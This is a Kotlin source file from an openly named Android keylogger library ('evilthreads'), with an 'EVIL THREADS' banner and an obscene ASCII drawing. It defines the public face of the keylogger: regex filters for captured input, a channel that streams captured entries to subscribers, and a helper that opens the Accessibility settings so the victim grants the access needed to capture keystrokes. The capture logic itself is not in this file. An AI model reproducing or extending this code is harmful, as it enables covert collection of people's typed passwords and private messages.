/*Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.*/
package com.evilthreads.keylogger

import android.content.Context
import android.content.Intent
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay

/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
object Keylogger{
    private val channel = Channel<KeyloggerEntry>()

    internal val patterns = mutableSetOf<Regex>()

    fun addPattern(regex: String) = patterns.add(Regex(regex))

    fun resetPatterns() = patterns.clear()

    internal suspend fun publish(entry: KeyloggerEntry) = channel.send(entry)

    //working on turning KeyloggerState into a subject and doing this with an observer
    //waits for keylogger to start then subscribes
    suspend fun subscribe(block: (KeyloggerEntry) -> Unit){
        while(!KeyloggerState.isEnabled())
            delay(500)
        for(entry in channel){
            block(entry)
        }
    }

    fun requestPermission(ctx: Context){
        val intent = Intent().apply{
            action = android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        ctx.startActivity(intent)
    }
}